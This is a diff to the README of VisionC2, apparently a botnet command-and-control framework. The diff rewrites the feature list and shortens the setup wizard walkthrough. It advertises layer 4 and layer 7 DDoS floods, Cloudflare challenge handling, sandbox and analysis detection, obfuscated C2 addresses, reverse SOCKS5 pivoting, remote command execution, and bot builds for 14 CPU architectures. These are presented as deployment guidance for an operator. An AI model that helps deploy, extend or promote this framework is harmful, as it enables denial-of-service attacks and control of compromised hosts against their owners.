@@ -19,7 +19,57 @@
 
 ---
 
-**VisionC2** is an advanced command and control framework with 3 modules DDOS/RCE/SOCKS5. The framework features multi-layer encryption, TLS 1.3 communication, and supports 14+ CPU architectures out of the box.
+#### 🎯 Attack Capabilities
+
+* **Layer 4**
+
+  * UDP, TCP, SYN, ACK, GRE, and DNS-based traffic generation
+* **Layer 7**
+
+  * HTTP / HTTPS / TLS traffic with HTTP/2 fingerprinting
+  * Cloudflare UAM handling support
+* **Control**
+
+  * Global stop command to immediately halt all active tasks
+
+---
+
+#### 🔒 Security Features
+
+* **TLS 1.3** with perfect forward secrecy for all communications
+* **Multi-Layer Encryption & Obfuscation**
+
+  * No hardcoded C2
+  * C2 address protected via RC4, XOR, byte substitution, and MD5
+* **HMAC Authentication**
+
+  * Challenge–response verification for agent integrity
+* **Anti-Analysis Protections**
+
+  * Multi-stage sandbox and analysis environment detection
+
+---
+
+#### 🔧 Infrastructure & Operations
+
+* **Automated Setup Wizard**
+
+  * Full deployment or C2 update-only modes
+  * Token generation and TLS certificate handling
+* **Reverse SOCKS5 Proxy Support**
+
+  * Traffic routing and pivoting through connected agents
+* **Remote Command Execution**
+
+  * Secure command dispatch with real-time or detached execution
+* **CNC Admin Console**
+
+  * Multi-user management and live agent visibility
+* **Flexible C2 Resolution**
+
+  * DNS TXT-based discovery with DoH fallback support
+
+---
 
 **Vision is built to be setup via setup script meaning there are no code changes required.**
 
@@ -48,97 +98,32 @@ python3 setup.py
 
 > 💡 **Setup Wizard handles Encryption, Certs, and Code Updates. The entire setup for Vision takes no more then 5 minutes.**
 
-### Setup Wizard Flow
+```text
+Setup Wizard Flow (Summary)
 
+[1] Full Setup        → New C2, magic code, certs (fresh install)
+[2] C2 URL Update    → Change C2 address only
+[0] Exit
+
+Step 1/5: C2 Configuration
+- C2 address: c2.domain.com:443 (TLS, fixed)
+- Admin port: 200
+
+Step 2/5: Security Tokens
+- Magic code, protocol version, crypt seed auto-generated
+- Multi-layer obfuscation applied
+
+Step 3/5: TLS Certificates
+- 4096-bit RSA key
+- Self-signed TLS certificate generated
+
+Step 4/5: Source Updates
+- CNC and bot configuration updated
+
+Step 5/5: Build
+- CNC server built
+- Bot binaries built (14 architectures)
 ```
-╔══════════════════════════════════════════════════════════╗
-║              Select Setup Mode                           ║
-╠══════════════════════════════════════════════════════════╣
-║                                                          ║
-║  [1] Full Setup                                          ║
-║      New C2 address, magic code, certs, everything       ║
-║      Use for: Fresh install or complete rebuild          ║
-║                                                          ║
-║  [2] C2 URL Update Only                                  ║
-║      Change C2 domain/IP, keep magic code & certs        ║
-║      Use for: Server migration, domain change            ║
-║                                                          ║
-║  [0] Exit                                                ║
-║                                                          ║
-╚══════════════════════════════════════════════════════════╝
-➜ Select option [1]: 1
-[i] Starting Full Setup...
-```
-
-```
-╔══════════════════════════════════════════════════════════╗
-║ Step 1/5: C2 Server Configuration                        ║
-╚══════════════════════════════════════════════════════════╝
-
-➜ Enter C2 server IP/domain [127.0.0.1]: c2.domain.com
-➜ Enter admin server port [420]: 200
-[✓] C2 configured: c2.domain.com:443
-[✓] Admin port: 200
-[i] Bot connection port is fixed at 443 (TLS)
-```
-
-```
-╔══════════════════════════════════════════════════════════╗
-║ Step 2/5: Security Token Generation                      ║
-╚══════════════════════════════════════════════════════════╝
-
-[i] Auto-generated Magic Code: 9rOKxDR%EV&90*X%
-[i] Auto-generated Protocol Version: V3_3
-[i] Auto-generated Crypt Seed: 3c841808
-
-? Use auto-generated security tokens? [Y/n]: y
-[i] Applying multi-layer obfuscation...
-[✓] C2 address obfuscation verified ✓
-```
-
-```
-╔══════════════════════════════════════════════════════════╗
-║ Step 3/5: TLS Certificate Generation                     ║
-╚══════════════════════════════════════════════════════════╝
-
-[i] Certificate details (press Enter for defaults):
-
-➜ Country code (2 letter) [US]: US
-➜ State/Province [California]: California
-➜ City [San Francisco]: San Francisco
-➜ Organization [Security Research]: Sec Team
-➜ Common Name (domain) [c2.domain.com]:
-➜ Valid days [365]: 360
-[i] Generating 4096-bit RSA private key...
-[i] Generating self-signed certificate...
-[✓] TLS certificates generated successfully
-```
-
-```
-╔══════════════════════════════════════════════════════════╗
-║ Step 4/5: Updating Source Code                           ║
-╚══════════════════════════════════════════════════════════╝
-
-[i] Updating cnc/main.go...
-[✓] CNC configuration updated
-[i] Updating bot/main.go...
-[✓] Bot configuration updated
-```
-
-```
-╔══════════════════════════════════════════════════════════╗
-║ Step 5/5: Building Binaries                              ║
-╚══════════════════════════════════════════════════════════╝
-
-? Build CNC server? [Y/n]: y
-[i] Building CNC server...
-[✓] CNC server built successfully
-? Build bot binaries (14 architectures)? [Y/n]: y
-[!] This will take several minutes...
-[i] Building bot binaries for 14 architectures...
-[i] This may take a few minutes...
-```
-
 **That's it!** The wizard handles everything:
 
 * C2 address configuration & obfuscation
@@ -219,13 +204,6 @@ VisionC2 operates on a client-server model with clear separation between adminis
 │   • TXT domain     → lookup.example.com (advanced)           │
 └──────────────────────────────────────────────────────────────┘
 ```
-
-### Communication Protocol
-
-1. **TLS 1.3 Encryption**: All communications use TLS 1.3 with perfect forward secrecy
-2. **Multi-Layer Obfuscation**: C2 address encrypted with 4 layers (XOR, RC4, MD5, Base64)
-3. **HMAC Authentication**: Challenge-response system to verify bot authenticity
-4. **Heartbeat System**: Regular check-ins to maintain connection and receive commands
 
 ---
 
